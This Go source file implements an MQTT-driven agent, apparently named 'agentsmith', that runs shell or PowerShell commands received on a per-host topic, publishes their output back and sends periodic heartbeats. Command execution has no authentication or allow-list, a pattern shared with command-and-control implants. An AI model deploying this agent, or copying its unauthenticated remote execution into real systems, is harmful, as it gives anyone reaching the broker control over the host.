package mqtt

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"time"

	mqtt "github.com/eclipse/paho.mqtt.golang"

	"agentsmith/server"
)

type Command struct {
	Cmd     string `json:"cmd"`
	Command string `json:"command,omitempty"`
}

type Response struct {
	Cmd      string `json:"cmd"`
	Stdout   string `json:"stdout,omitempty"`
	Stderr   string `json:"stderr,omitempty"`
	ExitCode int    `json:"exit_code,omitempty"`
	Hostname string `json:"hostname,omitempty"`
	Uptime   int64  `json:"uptime,omitempty"`
	Version  string `json:"version,omitempty"`
	Error    string `json:"error,omitempty"`
}

type Status struct {
	Hostname  string `json:"hostname"`
	Uptime    int64  `json:"uptime"`
	Version   string `json:"version"`
	Timestamp string `json:"timestamp"`
}

type Client struct {
	mqtt.Client
	hostname    string
	start       time.Time
	version     string
	cmdTopic    string
	respTopic   string
	statusTopic string
}

func New(broker string) (*Client, error) {
	hostname, _ := os.Hostname()
	clientID := fmt.Sprintf("agentsmith-%s-%d", hostname, time.Now().UnixNano()%100000)

	cmdTopic := fmt.Sprintf("agent/%s/cmd", hostname)
	respTopic := fmt.Sprintf("agent/%s/resp", hostname)
	statusTopic := fmt.Sprintf("agent/%s/status", hostname)

	c := &Client{
		hostname:    hostname,
		start:       time.Now(),
		version:     "1.0.0",
		cmdTopic:    cmdTopic,
		respTopic:   respTopic,
		statusTopic: statusTopic,
	}

	opts := mqtt.NewClientOptions()
	opts.AddBroker(broker)
	opts.SetClientID(clientID)
	opts.SetCleanSession(false)
	opts.SetAutoReconnect(true)
	opts.SetConnectionLostHandler(func(client mqtt.Client, err error) {
		log.Printf("MQTT connection lost: %v", err)
	})
	opts.SetOnConnectHandler(func(client mqtt.Client) {
		log.Println("MQTT reconnected, re-subscribing...")
		if token := client.Subscribe(cmdTopic, 0, nil); token.Wait() && token.Error() != nil {
			log.Printf("Resubscribe error: %v", token.Error())
		}
	})
	opts.SetDefaultPublishHandler(c.handleMessage)

	client := mqtt.NewClient(opts)
	if token := client.Connect(); token.Wait() && token.Error() != nil {
		return nil, fmt.Errorf("MQTT connect: %w", token.Error())
	}
	c.Client = client

	if token := c.Subscribe(c.cmdTopic, 0, nil); token.Wait() && token.Error() != nil {
		c.Disconnect(250)
		return nil, fmt.Errorf("MQTT subscribe: %w", token.Error())
	}

	log.Printf("Subscribed to %s", c.cmdTopic)
	go c.heartbeat()

	return c, nil
}

func (c *Client) handleMessage(client mqtt.Client, msg mqtt.Message) {
	var cmd Command
	if err := json.Unmarshal(msg.Payload(), &cmd); err != nil {
		log.Printf("Invalid command JSON: %v", err)
		c.publishResponse(Response{
			Cmd:   "error",
			Error: fmt.Sprintf("Invalid JSON: %v", err),
		})
		return
	}

	log.Printf("Received command: %s", cmd.Cmd)

	switch cmd.Cmd {
	case "execute":
		result := server.Execute(cmd.Command)
		c.publishResponse(Response{
			Cmd:      "execute",
			Stdout:   result.Stdout,
			Stderr:   result.Stderr,
			ExitCode: result.ExitCode,
		})

	case "ps":
		result := server.ExecutePS(cmd.Command)
		c.publishResponse(Response{
			Cmd:      "ps",
			Stdout:   result.Stdout,
			Stderr:   result.Stderr,
			ExitCode: result.ExitCode,
		})

	case "info":
		c.publishResponse(Response{
			Cmd:      "info",
			Hostname: c.hostname,
			Uptime:   int64(time.Since(c.start).Seconds()),
			Version:  c.version,
		})

	default:
		c.publishResponse(Response{
			Cmd:   "error",
			Error: fmt.Sprintf("Unknown command: %s", cmd.Cmd),
		})
	}
}

func (c *Client) publishResponse(resp Response) {
	data, _ := json.Marshal(resp)
	if token := c.Publish(c.respTopic, 0, false, data); token.Wait() && token.Error() != nil {
		log.Printf("Failed to publish response: %v", token.Error())
	}
	log.Printf("Published response to %s: %s", c.respTopic, string(data))
}

func (c *Client) heartbeat() {
	for {
		status := Status{
			Hostname:  c.hostname,
			Uptime:    int64(time.Since(c.start).Seconds()),
			Version:   c.version,
			Timestamp: time.Now().Format(time.RFC3339),
		}
		data, _ := json.Marshal(status)
		if token := c.Publish(c.statusTopic, 0, false, data); token.Wait() && token.Error() != nil {
			log.Printf("Failed to publish heartbeat: %v", token.Error())
		}
		time.Sleep(30 * time.Second)
	}
}

func (c *Client) GetHostname() string {
	return c.hostname
}

func (c *Client) GetUptime() int64 {
	return int64(time.Since(c.start).Seconds())
}
